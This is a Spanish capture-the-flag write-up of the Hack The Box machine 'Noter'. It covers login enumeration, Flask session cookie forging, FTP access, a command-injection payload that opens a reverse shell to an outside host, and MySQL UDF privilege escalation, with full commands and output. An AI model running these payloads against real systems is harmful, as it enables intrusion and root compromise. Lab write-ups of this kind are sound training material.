@@ -1,0 +1,616 @@
+---
+layout: post
+title: Noter
+date: 2023-10-12
+description:
+img:
+fig-caption:
+tags: []
+---
+___
+
+<center><img src="/writeups/assets/img/Noter-htb/Noter.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.160 -oG openports
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 10:36 GMT
+Nmap scan report for 10.10.11.160
+Host is up (0.059s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+5000/tcp open  upnp
+
+Nmap done: 1 IP address (1 host up) scanned in 17.14 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p21,22,5000 10.10.11.160 -oN portscan
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-12 10:36 GMT
+Nmap scan report for 10.10.11.160
+Host is up (0.070s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
+|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
+|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
+5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
+|_http-title: Noter
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.05 seconds
+```
+
+## Puerto 5000 (HTTP)
+
+Con ```whatweb``` analizo las tecnologías que emplea el servidor web
+
+```null
+whatweb http://10.10.11.160:5000
+http://10.10.11.160:5000 [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.8.10], IP[10.10.11.160], Python[3.8.10], Script[text/javascript], Title[Noter], Werkzeug[2.0.2]
+```
+
+<img src="/writeups/assets/img/Noter-htb/1.png" alt="">
+
+Me puedo registrar
+
+<img src="/writeups/assets/img/Noter-htb/2.png" alt="">
+
+Una vez loggeado, en la página principal hay un menú que me permite cambiar el plan y ver las notas que están creadas
+
+<img src="/writeups/assets/img/Noter-htb/3.png" alt="">
+
+Pero algo a tener en cuenta es que al iniciar sesión, aparece une error distinos si el usuario no existe o si es inválida la contraseña
+
+<img src="/writeups/assets/img/Noter-htb/4.png" alt="">
+
+<img src="/writeups/assets/img/Noter-htb/5.png" alt="">
+
+Intercepto la petición con ```BurpSuite``` para ver como se tramita
+
+```null
+POST /login HTTP/1.1
+Host: 10.10.11.160:5000
+Content-Length: 28
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.11.160:5000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.11.160:5000/login
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+username=rubbx&password=test
+```
+
+Con ```wfuzz``` aplico fuerza bruta para encontrar usuarios
+
+```null
+wfuzz -c -t 200 --ss="Invalid login" -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -d 'username=FUZZ&password=test' http://10.10.11.160:5000/login
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.160:5000/login
+Total requests: 10177
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
+=====================================================================
+
+000001208:   200        68 L     110 W      2026 Ch     "blue"                                                                                                                                          
+
+Total time: 0
+Processed Requests: 10177
+Filtered Requests: 10176
+Requests/sec.: 0
+```
+
+Por tanto ```blue``` es un usuario registrado que me puede servir en un futuro. La cookie que se settea está formado por un JWT
+
+```null
+GET /dashboard HTTP/1.1
+Host: 10.10.11.160:5000
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.11.160:5000/VIP
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicnViYngifQ.ZSf3vA.NhlJpydkmUV99nayMPhu5rMus90
+Connection: close
+```
+
+Desde la web [jwt.io](https://jwt.io) se puede ver como está compuesto. No puedo modificarlo al no disponer del secreto
+
+<img src="/writeups/assets/img/Noter-htb/6.png" alt="">
+
+Pruebo a aplicar fuerza bruta con la herramienta [flask-unsign](https://github.com/Paradoxis/Flask-Unsign)
+
+```null
+flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicnViYngifQ.ZSf3vA.NhlJpydkmUV99nayMPhu5rMus90' --no-literal-eval
+[*] Session decodes to: {'logged_in': True, 'username': 'rubbx'}
+[*] Starting brute-forcer with 8 threads..
+[+] Found secret key after 17664 attempts
+b'secret123'
+```
+
+Habiendo obtenido este valor puedo crear la nueva cookie para el usuario ```blue```
+
+```null
+flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoicnViYngifQ.ZSf3vA.NhlJpydkmUV99nayMPhu5rMus90'
+{'logged_in': True, 'username': 'rubbx'}
+```
+
+```null
+flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
+eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.ZSf87g.8zx2yqZ8Ak6THo0a8dlRYKbe3xI
+```
+
+La cambio en el navegador haciendo un ```cookie-hijacking```
+
+<img src="/writeups/assets/img/Noter-htb/7.png" alt="">
+
+Al recargar la página, aparezco loggeado como este usuario
+
+<img src="/writeups/assets/img/Noter-htb/8.png" alt="">
+
+Tiene almacenada una nota con credenciales para el servicio FTP
+
+<img src="/writeups/assets/img/Noter-htb/9.png" alt="">
+
+Me conecto y listo los archivos
+
+```null
+ftp 10.10.11.160
+Connected to 10.10.11.160.
+220 (vsFTPd 3.0.3)
+Name (10.10.11.160:rubbx): blue
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||43307|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 1002     1002         4096 May 02  2022 files
+-rw-r--r--    1 1002     1002        12569 Dec 24  2021 policy.pdf
+```
+
+Descargo el PDF para examinarlo
+
+```null
+ftp> get policy.pdf
+local: policy.pdf remote: policy.pdf
+229 Entering Extended Passive Mode (|||35956|)
+150 Opening BINARY mode data connection for policy.pdf (12569 bytes).
+100% |********************************************************************************************************************************************************************| 12569      131.69 KiB/s    00:00 ETA
+226 Transfer complete.
+12569 bytes received in 00:00 (24.39 KiB/s)
+```
+
+Las contraseñas usadas por defecto siguen un patrón específico
+
+<img src="/writeups/assets/img/Noter-htb/10.png" alt="">
+
+Como había visto al usuario ```ftp_admin``` como autor de la nota, pruebo a conectarme al FTP como este con la contraseña ```ftp_admin@Noter!```. De nuevo es válida, y ahora puedo ver más archivos
+
+```null
+ftp 10.10.11.160
+Connected to 10.10.11.160.
+220 (vsFTPd 3.0.3)
+Name (10.10.11.160:rubbx): ftp_admin
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||11897|)
+150 Here comes the directory listing.
+-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip
+-rw-r--r--    1 1003     1003        26298 Dec 01  2021 app_backup_1638395546.zip
+226 Directory send OK.
+```
+
+Parecen backups de la aplicación web
+
+```null
+ftp> prompt off
+Interactive mode off.
+ftp> mget *
+local: app_backup_1635803546.zip remote: app_backup_1635803546.zip
+229 Entering Extended Passive Mode (|||57850|)
+150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).
+100% |*******************************************************************************************************************************************************************| 25559       27.59 KiB/s    00:00 ETA
+226 Transfer complete.
+25559 bytes received in 00:01 (17.42 KiB/s)
+local: app_backup_1638395546.zip remote: app_backup_1638395546.zip
+229 Entering Extended Passive Mode (|||61168|)
+150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).
+100% |*******************************************************************************************************************************************************************| 26298       35.79 KiB/s    00:00 ETA
+226 Transfer complete.
+26298 bytes received in 00:01 (22.66 KiB/s)
+```
+
+Los extraigo en directorios diferentes
+
+```null
+unzip app_backup_1635803546.zip  -d app_backup_1
+```
+
+```null
+unzip app_backup_1638395546.zip -d app_backup_2
+```
+
+Aplico una comparativa con el comando ```diff```
+
+```null
+diff app_backup_1 app_backup_2
+diff app_backup_1/app.py app_backup_2/app.py
+17,18c17,18
+< app.config['MYSQL_USER'] = 'root'
+< app.config['MYSQL_PASSWORD'] = 'Nildogg36'
+---
+> app.config['MYSQL_USER'] = 'DB_user'
+> app.config['MYSQL_PASSWORD'] = 'DB_password'
+21a22,23
+> attachment_dir = 'misc/attachments/'
+> 
+239a242,368
+> 
+> # Export notes
+> @app.route('/export_note', methods=['GET', 'POST'])
+> @is_logged_in
+> def export_note():
+>     if check_VIP(session['username']):
+>         try:
+>             cur = mysql.connection.cursor()
+> 
+>             # Get note
+>             result = cur.execute("SELECT * FROM notes WHERE author = %s", ([session['username']]))
+> 
+>             notes = cur.fetchall()
+> 
+>             if result > 0:
+>                 return render_template('export_note.html', notes=notes)
+>             else:
+>                 msg = 'No notes Found'
+>                 return render_template('export_note.html', msg=msg)
+>             # Close connection
+>             cur.close()
+>                 
+>         except Exception as e:
+>             return render_template('export_note.html', error="An error occured!")
+> 
+>     else:
+>         abort(403)
+> 
+> # Export local
+> @app.route('/export_note_local/<string:id>', methods=['GET'])
+> @is_logged_in
+> def export_note_local(id):
+>     if check_VIP(session['username']):
+> 
+>         cur = mysql.connection.cursor()
+> 
+>         result = cur.execute("SELECT * FROM notes WHERE id = %s and author = %s", (id,session['username']))
+> 
+>         if result > 0:
+>             note = cur.fetchone()
+> 
+>             rand_int = random.randint(1,10000)
+>             command = f"node misc/md-to-pdf.js  $'{note['body']}' {rand_int}"
+>             subprocess.run(command, shell=True, executable="/bin/bash")
+>         
+>             return send_file(attachment_dir + str(rand_int) +'.pdf', as_attachment=True)
+> 
+>         else:
+>             return render_template('dashboard.html')
+>     else:
+>         abort(403)
+> 
+> # Export remote
+> @app.route('/export_note_remote', methods=['POST'])
+> @is_logged_in
+> def export_note_remote():
+>     if check_VIP(session['username']):
+>         try:
+>             url = request.form['url']
+> 
+>             status, error = parse_url(url)
+> 
+>             if (status is True) and (error is None):
+>                 try:
+>                     r = pyrequest.get(url,allow_redirects=True)
+>                     rand_int = random.randint(1,10000)
+>                     command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
+>                     subprocess.run(command, shell=True, executable="/bin/bash")
+> 
+>                     if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):
+> 
+>                         return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)
+> 
+>                     else:
+>                         return render_template('export_note.html', error="Error occured while exporting the !")
+> 
+>                 except Exception as e:
+>                     return render_template('export_note.html', error="Error occured!")
+> 
+> 
+>             else:
+>                 return render_template('export_note.html', error=f"Error occured while exporting ! ({error})")
+>             
+>         except Exception as e:
+>             return render_template('export_note.html', error=f"Error occured while exporting ! ({e})")
+> 
+>     else:
+>         abort(403)
+> 
+> # Import notes
+> @app.route('/import_note', methods=['GET', 'POST'])
+> @is_logged_in
+> def import_note():
+> 
+>     if check_VIP(session['username']):
+>         if request.method == 'GET':
+>             return render_template('import_note.html')
+> 
+>         elif request.method == "POST":
+>             title = request.form['title']
+>             url = request.form['url']
+> 
+>             status, error = parse_url(url)
+> 
+>             if (status is True) and (error is None):
+>                 try:
+>                     r = pyrequest.get(url,allow_redirects=True)
+>                     md = "\n\n".join(r.text.split("\n")[:])
+> 
+>                     body = markdown.markdown(md)
+>                     cur = mysql.connection.cursor()
+>                     cur.execute("INSERT INTO notes(title, body, author, create_date ) VALUES  (%s, %s, %s ,%s) ", (title, body[:900], session['username'], time.ctime()))
+>                     mysql.connection.commit()
+>                     cur.close()
+> 
+>                     return render_template('import_note.html', msg="Note imported successfully!")
+> 
+>                 
+>                 except Exception as e:
+>                     return render_template('import_note.html', error="An error occured when importing!")
+> 
+>             else:
+>                 return render_template('import_note.html', error=f"An error occured when importing! ({error})")
+> 
+>     else:
+>         abort(403)
+> 
+Common subdirectories: app_backup_1/misc and app_backup_2/misc
+Common subdirectories: app_backup_1/templates and app_backup_2/templates
+```
+
+Las credenciales de ```MySQL``` están hardcodeadas en el código. Se está ejecutando con ```subprocess.run``` un comando a nivel de sistema empleando una ```bash```. Se está pasando como argumento el campo ```body``` de las notas que se crean. La forma de ejecutarlo es a través del método de la URL, ya que está dentro de la función. Creo un payload que me permita escapar de este contexto y ejecutar comandos. Al hacer click en exportar la nota, se debería de ejecutar
+
+```null
+node misc/md-to-pdf.js  $'';ping -c 1 10.10.16.4; echo '' {rand_int}
+node:internal/modules/cjs/loader:1042
+  throw err;
+  ^
+
+Error: Cannot find module '/home/rubbx/Desktop/HTB/Machines/Noter/misc/md-to-pdf.js'
+    at Module._resolveFilename (node:internal/modules/cjs/loader:1039:15)
+    at Module._load (node:internal/modules/cjs/loader:885:27)
+    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)
+    at node:internal/main/run_main_module:23:47 {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: []
+}
+
+Node.js v18.13.0
+PING 10.10.16.4 (10.10.16.4) 56(84) bytes of data.
+64 bytes from 10.10.16.4: icmp_seq=1 ttl=64 time=0.321 ms
+
+--- 10.10.16.4 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.321/0.321/0.321/0.000 ms
+ {rand_int}
+```
+
+El nota introduzco ```;ping -c 1 10.10.16.4; echo ''```
+
+<img src="/writeups/assets/img/Noter-htb/11.png" alt="">
+
+Sin embargo, devuelve un error con un código de estado 500. Esto puede deberse a que en el campo ```body``` se almacena algún dato adicional (como formato de texto) que corrompan la sintaxis
+
+<img src="/writeups/assets/img/Noter-htb/12.png" alt="">
+
+Volviendo al código fuente, la función que realiza la misma tarea pero de forma remota, se queda únicamente con la data del archivo que indique y eliminando el salto de línea, ya que utiliza ```r.text.strip()```. Creo un archivo ```exploit.md``` con el siguiente contenido
+
+```null
+'; ping -c1 10.10.16.4; echo '
+```
+
+Lo comparto con un servicio HTTP con ```python``` e introduzco en el formulario
+
+<img src="/writeups/assets/img/Noter-htb/13.png" alt="">
+
+Al darle click en exportar recibo la traza ICMP en mi equipo
+
+```null
+tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+15:08:02.987766 IP 10.10.11.160 > 10.10.16.4: ICMP echo request, id 3, seq 1, length 64
+15:08:02.996250 IP 10.10.16.4 > 10.10.11.160: ICMP echo reply, id 3, seq 1, length 64
+```
+
+Modifico el exploit para enviarme una reverse shell
+
+```null
+'; bash -i >& /dev/tcp/10.10.16.4/443 0>&1; echo '
+```
+
+Gano acceso en una sesión de ```netcat```
+
+```null
+nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.11.160] 55704
+bash: cannot set terminal process group (1263): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@noter:~/app/web$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, file is /dev/null
+svc@noter:~/app/web$ ^Z
+zsh: suspended  nc -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  nc -nlvp 443
+                              reset xterm
+svc@noter:~/app/web$ export TERM=xterm-color
+svc@noter:~/app/web$ export SHELL=bash
+svc@noter:~/app/web$ stty rows 55 columns 209
+svc@noter:~/app/web$ source ~/.bashrc
+```
+
+Puedo ver la primera flag
+
+```null
+svc@noter:~$ cat user.txt 
+ff4d9ea856683c0e420bb3b29804aca6
+```
+
+# Escalada
+
+El demonio de ```mysql``` lo ejecuta el usuario ```root```
+
+```null
+svc@noter:/etc/systemd/system$ cat mysql-start.service 
+[Unit]
+Description=MySQL service
+
+[Service]
+ExecStart=/usr/sbin/mysqld
+User=root
+Group=root
+
+[Install]
+WantedBy=multi-user.target
+```
+
+Es posible escalar privilegios a través la inyección de una librería, según esta guía de [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library). El código de la librería se encuentra en [exploit-db](https://www.exploit-db.com/exploits/1518). Compilo el código
+
+```null
+svc@noter:/tmp$ gcc -g -c raptor_udf2.c
+svc@noter:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+Me conecto a la base de datos
+
+```null
+svc@noter:/tmp$ mysql -uroot -p'Nildogg36'
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 22028
+Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+```
+
+Dentro de ```mysql```, creo la tabla ```foo```
+
+```null
+MariaDB [(none)]> use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [mysql]> create table foo(line blob);
+Query OK, 0 rows affected (0.005 sec)
+```
+
+Importo la librería
+
+```
+MariaDB [mysql]> insert into foo values(load_file('/tmp/raptor_udf2.so'));
+Query OK, 1 row affected (0.002 sec)
+```
+
+Busco la ruta donde se encuentran los plugins
+
+```null
+MariaDB [mysql]> show variables like '%plugin%';
++-----------------+---------------------------------------------+
+| Variable_name   | Value                                       |
++-----------------+---------------------------------------------+
+| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
+| plugin_maturity | gamma                                       |
++-----------------+---------------------------------------------+
+2 rows in set (0.001 sec)
+```
+
+Inserto el contenido de la librería ahí
+
+```
+MariaDB [mysql]> select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';
+Query OK, 1 row affected (0.001 sec)
+```
+
+Creo una función donde inyectaré el comando
+
+```
+MariaDB [mysql]> create function do_system returns integer soname 'raptor_udf2.so';
+Query OK, 0 rows affected (0.000 sec)
+```
+
+Le asigno el priveligio SUID a la ```bash```
+
+```
+MariaDB [mysql]> select do_system('chmod u+s /bin/bash');
++----------------------------------+
+| do_system('chmod u+s /bin/bash') |
++----------------------------------+
+|                                0 |
++----------------------------------+
+1 row in set (0.002 sec)
+
+MariaDB [mysql]> exit
+Bye
+```
+
+Puedo ver la segunda flag
+
+```null
+svc@noter:/tmp$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+svc@noter:/tmp$ bash -p
+bash-5.0# cat /root/root.txt
+0ffe7d67bab1fc37c215eaed0189a53b
+```
